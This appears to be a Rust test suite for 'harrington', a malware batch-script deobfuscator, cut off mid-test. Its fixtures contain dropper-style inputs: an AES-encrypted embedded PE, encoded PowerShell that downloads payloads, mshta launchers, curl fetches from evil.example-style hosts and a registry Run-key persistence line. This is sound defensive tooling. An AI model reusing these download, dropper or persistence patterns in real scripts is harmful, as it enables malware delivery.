#![allow(clippy::expect_used, clippy::unwrap_used)]

use assert_cmd::Command;
use std::fs;
use tempfile::TempDir;

#[test]
fn deob_writes_deobfuscated_file() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "set X=hi\r\necho %X%\r\n").expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();
    let deob = out_dir.join("deobfuscated.bat");
    assert!(deob.exists(), "deobfuscated.bat not produced");
    let contents = fs::read_to_string(&deob).expect("read");
    assert!(contents.contains("echo hi"), "got:\n{}", contents);
}

#[test]
fn deob_force_overwrites_existing_report_files() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "echo first\r\n").expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();

    fs::write(&input, "echo second\r\n").expect("rewrite");
    Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
            "--force",
        ])
        .assert()
        .success();

    let contents = fs::read_to_string(out_dir.join("deobfuscated.bat")).expect("read");
    assert!(
        contents.contains("echo second") && !contents.contains("echo first"),
        "stale deobfuscated output after --force:\n{}",
        contents
    );
}

#[test]
fn deob_force_removes_stale_generated_artifacts() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "echo first\r\n").expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();

    fs::write(out_dir.join("0123456789.exe"), b"stale pe").expect("write stale exe");
    fs::write(out_dir.join("0123456789.meta"), b"stale meta").expect("write stale meta");
    fs::write(out_dir.join("analyst-notes.txt"), b"keep").expect("write analyst note");

    fs::write(&input, "echo second\r\n").expect("rewrite");
    Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
            "--force",
        ])
        .assert()
        .success();

    let entries: Vec<_> = fs::read_dir(&out_dir)
        .expect("read out")
        .filter_map(|e| e.ok())
        .map(|e| e.file_name().to_string_lossy().to_string())
        .collect();
    assert!(
        !entries
            .iter()
            .any(|name| name.ends_with(".exe") || name.ends_with(".meta")),
        "stale generated artifact remained after --force: {:?}",
        entries
    );
    assert!(
        entries.iter().any(|name| name == "analyst-notes.txt"),
        "unrelated analyst note was removed by --force: {:?}",
        entries
    );
}

#[test]
fn deob_force_refuses_generated_output_directory_collision() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "echo hi\r\n").expect("write");
    let out_dir = dir.path().join("out");
    fs::create_dir_all(out_dir.join("0123456789.exe")).expect("mkdir generated collision");

    Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
            "--force",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains(
            "refusing to remove generated output directory",
        ));
}

#[test]
fn deob_writes_extracted_child_bat() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, r#"cmd /c "echo hi""#).expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();

    let entries: Vec<_> = fs::read_dir(&out_dir)
        .expect("read out")
        .filter_map(|e| e.ok())
        .map(|e| e.file_name().to_string_lossy().to_string())
        .collect();
    let has_child_bat = entries
        .iter()
        .any(|n| n.ends_with(".bat") && n != "deobfuscated.bat");
    assert!(has_child_bat, "no child .bat in {:?}", entries);
}

#[test]
fn deob_writes_traits_json() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "echo hi").expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();

    let traits_path = out_dir.join("traits.json");
    assert!(traits_path.exists(), "traits.json missing");
    let contents = fs::read_to_string(&traits_path).expect("read");
    // Should parse as JSON array (possibly empty)
    let _: serde_json::Value = serde_json::from_str(&contents).expect("valid json");
}

#[test]
fn deob_writes_recovered_pe_blob_and_meta_file() {
    // Synthesize a minimal AES-chain dropper: a `:: <b64>` line whose
    // ciphertext is AES-CBC-encrypted + gzipped + starts with `MZ`,
    // plus the PS body that carries the Key+IV literals. End-to-end
    // exercises the orchestrator's `recovered_pe.push(...)` + the CLI's
    // dump-with-companion-meta logic.
    use aes::cipher::{block_padding::Pkcs7, BlockEncryptMut, KeyIvInit};
    use base64::Engine;
    use flate2::write::GzEncoder;
    use flate2::Compression;
    use std::io::Write;

    type Aes256CbcEnc = cbc::Encryptor<aes::Aes256>;

    let key: [u8; 32] = *b"01234567890123456789012345678901";
    let iv: [u8; 16] = *b"abcdefghijklmnop";

    // Fake PE — must be big enough that gzip(pe) → AES-CBC → base64
    // exceeds the orchestrator's 200-char `::\s?<b64>{200,}` gate.
    // Pad with non-zero pseudorandom bytes so gzip can't compress it
    // away to nothing.
    let mut pe = vec![0u8; 2048];
    pe[0] = b'M';
    pe[1] = b'Z';
    pe[0x3c] = 0x40;
    pe[0x40] = b'P';
    pe[0x41] = b'E';
    pe[0x56] = 0x02;
    // Sprinkle non-zero data after the headers so the gzip output is
    // large enough to clear the gate.
    for (i, slot) in pe[256..].iter_mut().enumerate() {
        *slot = (i as u8).wrapping_mul(31).wrapping_add(7);
    }

    let mut gz = GzEncoder::new(Vec::new(), Compression::default());
    gz.write_all(&pe).expect("gz write");
    let gzipped = gz.finish().expect("gz finish");

    let mut ct = vec![0u8; gzipped.len() + 16];
    let ct_len = Aes256CbcEnc::new(&key.into(), &iv.into())
        .encrypt_padded_b2b_mut::<Pkcs7>(&gzipped, &mut ct)
        .expect("encrypt")
        .len();
    ct.truncate(ct_len);

    let ct_b64 = base64::engine::general_purpose::STANDARD.encode(&ct);
    let key_b64 = base64::engine::general_purpose::STANDARD.encode(key);
    let iv_b64 = base64::engine::general_purpose::STANDARD.encode(iv);

    // Minimum PS body shape the orchestrator's `try_extract_simple_ps_aes`
    // accepts — the colon-space envelope plus Key/IV literals in PS form.
    let script = format!(
        "@echo off\r\n\
         set \"EtnCTS=$a.Key=[System.Convert]::FromBase64String('{key_b64}');\
         $a.IV=[System.Convert]::FromBase64String('{iv_b64}');\"\r\n\
         :: {ct_b64}\r\n"
    );

    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, &script).expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();

    let entries: Vec<_> = fs::read_dir(&out_dir)
        .expect("read out")
        .filter_map(|e| e.ok())
        .map(|e| e.file_name().to_string_lossy().to_string())
        .collect();
    let exe = entries.iter().find(|n| n.ends_with(".exe"));
    let meta = entries.iter().find(|n| n.ends_with(".meta"));
    assert!(
        exe.is_some(),
        "no recovered .exe in out-dir; got {:?}",
        entries
    );
    assert!(
        meta.is_some(),
        "no .meta companion in out-dir; got {:?}",
        entries
    );
    // .exe bytes should be the PE we encrypted in.
    let exe_bytes = fs::read(out_dir.join(exe.unwrap())).expect("read exe");
    assert_eq!(&exe_bytes[..2], b"MZ");
    // .meta should mention the origin label.
    let meta_text = fs::read_to_string(out_dir.join(meta.unwrap())).expect("read meta");
    assert!(
        meta_text.contains("origin:") && meta_text.contains("size:"),
        ".meta missing fields:\n{meta_text}"
    );
}

#[test]
fn deob_writes_extracted_ps1() {
    use base64::Engine;
    let payload = "Write-Host hi";
    let utf16: Vec<u8> = payload
        .encode_utf16()
        .flat_map(|u| u.to_le_bytes())
        .collect();
    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);

    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, format!("powershell -EncodedCommand {}", b64)).expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();

    let entries: Vec<_> = fs::read_dir(&out_dir)
        .expect("read out")
        .filter_map(|e| e.ok())
        .map(|e| e.file_name().to_string_lossy().to_string())
        .collect();
    let has_ps1 = entries.iter().any(|n| n.ends_with(".ps1"));
    assert!(has_ps1, "no .ps1 in {:?}", entries);
}

#[test]
fn deob_writes_extracted_jscript() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        r#"mshta javascript:var u="https://js-payload.example/a.js";close()"#,
    )
    .expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();

    let extracted = fs::read_dir(&out_dir)
        .expect("read out")
        .filter_map(|e| e.ok())
        .find(|e| e.file_name().to_string_lossy().ends_with(".js"))
        .expect("extracted .js missing");
    let contents = fs::read_to_string(extracted.path()).expect("read extracted js");
    assert!(
        contents.contains("https://js-payload.example/a.js"),
        "got:\n{}",
        contents
    );
}

#[test]
fn deob_writes_extracted_vbs() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        r#"mshta vbscript:CreateObject("WScript.Shell").Run("calc.exe"):close"#,
    )
    .expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();

    let extracted = fs::read_dir(&out_dir)
        .expect("read out")
        .filter_map(|e| e.ok())
        .find(|e| e.file_name().to_string_lossy().ends_with(".vbs"))
        .expect("extracted .vbs missing");
    let contents = fs::read_to_string(extracted.path()).expect("read extracted vbs");
    assert!(
        contents.contains("CreateObject") && contents.contains("calc.exe"),
        "got:\n{}",
        contents
    );
}

#[test]
fn deob_writes_same_bytes_extracted_jscript_and_vbs() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "mshta javascript:shared_payload\r\nmshta vbscript:shared_payload\r\n",
    )
    .expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();

    let entries: Vec<_> = fs::read_dir(&out_dir)
        .expect("read out")
        .filter_map(|e| e.ok())
        .map(|e| e.file_name().to_string_lossy().to_string())
        .collect();
    assert!(
        entries.iter().any(|name| name.ends_with(".js")),
        "same-bytes JScript artifact missing: {entries:?}"
    );
    assert!(
        entries.iter().any(|name| name.ends_with(".vbs")),
        "same-bytes VBScript artifact missing: {entries:?}"
    );
}

#[test]
fn deob_writes_normalized_ps1_when_readability_improves() {
    use base64::Engine;
    let decoded = "Invoke-WebRequest -Uri 'https://readable.example/payload.exe'";
    let decoded_b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
    let payload = format!(
        "iex ([System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('{decoded_b64}')))"
    );
    let utf16: Vec<u8> = payload
        .encode_utf16()
        .flat_map(|u| u.to_le_bytes())
        .collect();
    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);

    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, format!("powershell -EncodedCommand {}", b64)).expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();

    let normalized = fs::read_dir(&out_dir)
        .expect("read out")
        .filter_map(|e| e.ok())
        .find(|e| e.file_name().to_string_lossy().ends_with(".normalized.ps1"))
        .expect("normalized ps1 missing");
    let contents = fs::read_to_string(normalized.path()).expect("read normalized ps1");
    assert!(
        contents.contains("https://readable.example/payload.exe"),
        "got:\n{}",
        contents
    );
}

#[test]
fn analyze_recurses_into_echoed_encoded_powershell_batch() {
    use base64::Engine;

    let decoded = "Invoke-WebRequest -Uri https://recursive.example/m2.zip";
    let utf16: Vec<u8> = decoded
        .encode_utf16()
        .flat_map(|u| u.to_le_bytes())
        .collect();
    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);

    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        format!(
            "@echo off\r\necho @echo off>hidden.bat\r\necho Powershell -NoProfile -Encoded {b64}>>hidden.bat\r\n"
        ),
    )
    .expect("write");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args(["analyze", input.to_str().expect("path"), "--jsonl"])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(
        stdout.contains("https://recursive.example/m2.zip"),
        "stdout:\n{}",
        stdout
    );
}

#[test]
fn analyze_emits_json_to_stdout() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "echo plain\r\n").expect("write");
    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args(["analyze", input.to_str().expect("path")])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    let s = String::from_utf8_lossy(&out.stdout);
    assert!(s.contains("\"deobfuscated\""), "stdout:\n{}", s);
}

#[test]
fn analyze_json_includes_extracted_counts() {
    use base64::Engine;

    let payload = "Write-Host analyze-json";
    let utf16: Vec<u8> = payload
        .encode_utf16()
        .flat_map(|u| u.to_le_bytes())
        .collect();
    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);

    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, format!("powershell -EncodedCommand {}", b64)).expect("write");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args(["analyze", input.to_str().expect("path")])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).expect("json");
    assert!(
        v["extracted"]["powershell"].as_u64().unwrap_or_default() >= 1,
        "PowerShell extracted count missing from analyze JSON: {v}"
    );
}

#[test]
fn deob_json_only_includes_extracted_counts() {
    use base64::Engine;

    let payload = "Write-Host deob-json";
    let utf16: Vec<u8> = payload
        .encode_utf16()
        .flat_map(|u| u.to_le_bytes())
        .collect();
    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);

    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, format!("powershell -EncodedCommand {}", b64)).expect("write");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args(["deob", input.to_str().expect("path"), "--json-only"])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).expect("json");
    assert!(
        v["extracted"]["powershell"].as_u64().unwrap_or_default() >= 1,
        "PowerShell extracted count missing from deob JSON: {v}"
    );
}

#[test]
fn report_default_omits_raw_text_includes_full_traits() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "curl -o out.exe http://x.example.com/y.exe\r\n").expect("write");
    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args(["report", input.to_str().expect("path")])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr:\n{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let s = String::from_utf8_lossy(&out.stdout);
    // Full typed trait list lands in `traits`; analyst-friendly downloads
    // still in `downloads`; sha256 is computed.
    assert!(s.contains("\"traits\""), "stdout:\n{}", s);
    assert!(s.contains("\"downloads\""), "stdout:\n{}", s);
    assert!(s.contains("\"input_sha256\""), "stdout:\n{}", s);
    assert!(s.contains("x.example.com/y.exe"), "url missing: {}", s);
    // Source and deob are off by default.
    assert!(!s.contains("\"source\""), "default included source: {}", s);
    assert!(
        !s.contains("\"deobfuscated\""),
        "default included deob: {}",
        s
    );
}

#[test]
fn report_include_source_and_deob_inlines_both() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "set X=marker_XYZ\r\necho %X%\r\n").expect("write");
    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "report",
            "--include-source",
            "--include-deob",
            input.to_str().expect("path"),
        ])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr:\n{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let s = String::from_utf8_lossy(&out.stdout);
    assert!(s.contains("\"source\""), "source missing");
    assert!(s.contains("\"deobfuscated\""), "deobfuscated missing");
    // Source verbatim (json-escaped).
    assert!(s.contains("marker_XYZ"), "marker missing from source/deob");
}

#[test]
fn analyze_jsonl_emits_lines() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "curl http://x/y\r\n").expect("write");
    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args(["analyze", input.to_str().expect("path"), "--jsonl"])
        .output()
        .expect("run");
    assert!(out.status.success());
    let s = String::from_utf8_lossy(&out.stdout);
    let lines: Vec<&str> = s.lines().collect();
    assert!(lines.len() >= 2, "expected >=2 lines, got: {:?}", lines);
    // Each line is valid JSON
    for line in &lines {
        let _: serde_json::Value = serde_json::from_str(line).expect("valid json line");
    }
    // First line is meta
    let first: serde_json::Value = serde_json::from_str(lines[0]).expect("first line");
    assert_eq!(first["kind"], "meta");
}

#[test]
fn analyze_jsonl_meta_includes_extracted_counts() {
    use base64::Engine;

    let payload = "Write-Host meta";
    let utf16: Vec<u8> = payload
        .encode_utf16()
        .flat_map(|u| u.to_le_bytes())
        .collect();
    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);

    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, format!("powershell -EncodedCommand {}", b64)).expect("write");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args(["analyze", input.to_str().expect("path"), "--jsonl"])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr:\n{}",
        String::from_utf8_lossy(&out.stderr)
    );

    let first_line = String::from_utf8_lossy(&out.stdout)
        .lines()
        .next()
        .expect("meta line")
        .to_string();
    let meta: serde_json::Value = serde_json::from_str(&first_line).expect("meta json");
    assert_eq!(meta["kind"], "meta");
    assert!(
        meta["extracted"]["powershell"].as_u64().unwrap_or_default() >= 1,
        "PowerShell extracted count missing from meta: {meta}"
    );
    assert_eq!(meta["extracted"]["cmd"].as_u64(), Some(0));
    assert_eq!(meta["extracted"]["jscript"].as_u64(), Some(0));
    assert_eq!(meta["extracted"]["vbs"].as_u64(), Some(0));
}

#[test]
fn analyze_jsonl_accepts_multiple_input_files() {
    let dir = TempDir::new().expect("tmp");
    let first = dir.path().join("first.bat");
    let second = dir.path().join("second.bat");
    fs::write(&first, "curl http://one.example/a\r\n").expect("write first");
    fs::write(&second, "curl http://two.example/b\r\n").expect("write second");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "analyze",
            first.to_str().expect("first path"),
            second.to_str().expect("second path"),
            "--jsonl",
        ])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr:\n{}",
        String::from_utf8_lossy(&out.stderr)
    );

    let lines: Vec<serde_json::Value> = String::from_utf8_lossy(&out.stdout)
        .lines()
        .map(|line| serde_json::from_str(line).expect("valid jsonl"))
        .collect();
    let metas: Vec<_> = lines
        .iter()
        .filter(|line| line["kind"] == "meta")
        .map(|line| line["input"].as_str().unwrap_or_default().to_string())
        .collect();
    assert_eq!(
        metas,
        vec![
            first.to_string_lossy().to_string(),
            second.to_string_lossy().to_string()
        ]
    );
    assert!(
        lines
            .iter()
            .any(|line| line.to_string().contains("one.example"))
            && lines
                .iter()
                .any(|line| line.to_string().contains("two.example")),
        "missing one of the expected URL traits: {lines:#?}"
    );
}

#[test]
fn analyze_multiple_input_files_requires_jsonl() {
    let dir = TempDir::new().expect("tmp");
    let first = dir.path().join("first.bat");
    let second = dir.path().join("second.bat");
    fs::write(&first, "echo one\r\n").expect("write first");
    fs::write(&second, "echo two\r\n").expect("write second");

    Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "analyze",
            first.to_str().expect("first path"),
            second.to_str().expect("second path"),
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains(
            "multiple analyze inputs require --jsonl",
        ));
}

#[test]
fn analyze_jsonl_accepts_file_list() {
    let dir = TempDir::new().expect("tmp");
    let first = dir.path().join("first.bat");
    let second = dir.path().join("second.bat");
    let list = dir.path().join("inputs.txt");
    fs::write(&first, "curl http://list-one.example/a\r\n").expect("write first");
    fs::write(&second, "curl http://list-two.example/b\r\n").expect("write second");
    fs::write(
        &list,
        format!("{}\n{}\n\n", first.display(), second.display()),
    )
    .expect("write list");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "analyze",
            "--file-list",
            list.to_str().expect("list path"),
            "--jsonl",
        ])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr:\n{}",
        String::from_utf8_lossy(&out.stderr)
    );

    let lines: Vec<serde_json::Value> = String::from_utf8_lossy(&out.stdout)
        .lines()
        .map(|line| serde_json::from_str(line).expect("valid jsonl"))
        .collect();
    let metas: Vec<_> = lines
        .iter()
        .filter(|line| line["kind"] == "meta")
        .map(|line| line["input"].as_str().unwrap_or_default().to_string())
        .collect();
    assert_eq!(
        metas,
        vec![
            first.to_string_lossy().to_string(),
            second.to_string_lossy().to_string()
        ]
    );
    assert!(
        lines
            .iter()
            .any(|line| line.to_string().contains("list-one.example"))
            && lines
                .iter()
                .any(|line| line.to_string().contains("list-two.example")),
        "missing one of the expected URL traits: {lines:#?}"
    );
}

#[test]
fn analyze_file_list_requires_jsonl() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    let list = dir.path().join("inputs.txt");
    fs::write(&input, "echo hi\r\n").expect("write input");
    fs::write(&list, format!("{}\n", input.display())).expect("write list");

    Command::cargo_bin("harrington")
        .expect("bin")
        .args(["analyze", "--file-list", list.to_str().expect("list path")])
        .assert()
        .failure()
        .stderr(predicates::str::contains(
            "analyze --file-list requires --jsonl",
        ));
}

#[test]
fn analyze_file_list_is_size_capped() {
    let dir = TempDir::new().expect("tmp");
    let list = dir.path().join("inputs.txt");
    fs::write(&list, "x".repeat(16 * 1024 * 1024 + 1)).expect("write list");

    Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "analyze",
            "--file-list",
            list.to_str().expect("list path"),
            "--jsonl",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains("file list"))
        .stderr(predicates::str::contains("exceeds"));
}

#[test]
fn analyze_can_emit_drive_profile_to_stderr() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "set X=hi\r\necho %X%\r\n").expect("write");

    Command::cargo_bin("harrington")
        .expect("bin")
        .env("HARRINGTON_PROFILE_DRIVE", "1")
        .args(["analyze", input.to_str().expect("path"), "--jsonl"])
        .assert()
        .success()
        .stderr(predicates::str::contains("harrington_profile_drive"))
        .stderr(predicates::str::contains("fast_expand_ms="));
}

#[test]
fn analyze_can_emit_final_profile_to_stderr() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "echo powershell -Command [Reflection.Assembly]::Load($b)\r\n",
    )
    .expect("write");

    Command::cargo_bin("harrington")
        .expect("bin")
        .env("HARRINGTON_PROFILE_FINAL", "1")
        .args(["analyze", input.to_str().expect("path"), "--jsonl"])
        .assert()
        .success()
        .stderr(predicates::str::contains("harrington_profile_final"));
}

#[cfg(unix)]
#[test]
fn analyze_jsonl_handles_closed_stdout_without_panic() {
    use std::io::{BufRead, BufReader};
    use std::process::{Command as StdCommand, Stdio};

    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    let mut body = String::new();
    for i in 0..200_000 {
        body.push_str(&format!(
            "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA{i:06}\r\n"
        ));
    }
    fs::write(&input, body).expect("write");

    let bin = assert_cmd::cargo::cargo_bin("harrington");
    let mut child = StdCommand::new(bin)
        .args(["analyze", input.to_str().expect("path"), "--jsonl"])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn");

    let stdout = child.stdout.take().expect("stdout");
    let mut reader = BufReader::new(stdout);
    let mut first_line = String::new();
    reader.read_line(&mut first_line).expect("read first line");
    assert!(
        first_line.contains(r#""kind":"meta""#),
        "line: {first_line}"
    );
    drop(reader);

    let output = child.wait_with_output().expect("wait");
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        output.status.success(),
        "closed stdout should exit cleanly, status={:?}, stderr:\n{}",
        output.status,
        stderr
    );
    assert!(
        !stderr.contains("panicked") && !stderr.contains("Broken pipe"),
        "closed stdout produced panic-like stderr:\n{}",
        stderr
    );
}

#[test]
fn summarize_emits_compact_report() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "curl -o out.exe http://x.example/y.exe\r\nreg add HKLM\\Run /v Evil /d \"C:\\\\evil.exe\"\r\n",
    )
    .expect("write");
    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args(["summarize", input.to_str().expect("path")])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    let s = String::from_utf8_lossy(&out.stdout);
    let v: serde_json::Value = serde_json::from_str(&s).expect("valid json");
    assert!(!v["downloads"].as_array().expect("downloads").is_empty());
    assert!(v["admin_commands"]["reg"].as_u64().expect("reg count") >= 1);
}

#[test]
fn summarize_can_enrich_lolbas_matches_from_external_json() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "mshta http://evil.example/payload.hta\r\n").expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 1, "unexpected matches: {matches:?}");
    assert_eq!(
        matches[0].get("name").and_then(|v| v.as_str()),
        Some("Mshta.exe")
    );
    assert_eq!(
        matches[0].get("lolbas_url").and_then(|v| v.as_str()),
        Some("https://lolbas-project.github.io/lolbas/Binaries/Mshta/")
    );
    assert_eq!(
        matches[0]
            .get("mitre_ids")
            .and_then(|v| v.as_array())
            .and_then(|ids| ids.first())
            .and_then(|v| v.as_str()),
        Some("T1218.005")
    );
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_url_paths() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "curl http://evil.example/payload/mshta.exe\r\n").expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_schemeless_url_paths() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "curl evil.example/payload/mshta.exe\r\n").expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
